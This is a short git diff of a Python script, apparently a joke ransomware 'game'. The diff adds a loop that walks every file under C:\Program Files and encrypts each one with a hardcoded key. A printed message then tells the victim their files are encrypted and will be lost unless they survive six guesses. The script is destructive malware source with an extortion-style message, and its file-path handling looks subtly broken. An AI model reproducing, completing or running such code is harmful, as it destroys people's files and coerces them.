@@ -51,10 +51,14 @@ def encrypt_file(key, in_filename, out_filename, chunksize):
 
 
 
+rootdir = 'C:\\Program Files\\'
 
-for i in os.listdir("C:\\"):
-    if not i.startswith("."):
-        encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", i, None, 64*1024)
+for subdir, dirs, files in os.walk(rootdir):
+    for aFile in files:
+        
+        encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", aFile, None, 64*1024)
+
+
 
 #just a fun sad thing I made
 print("Lets play a little game shall we?")
@@ -64,3 +68,6 @@ print("You have to survive 6 guesses")
 print("Also all the files on your computer are now encrypted, meaning that if you")
 print(" exit this program you will not get any of your files back.")
 print("If you survive they will be decrypted")
+
+
+
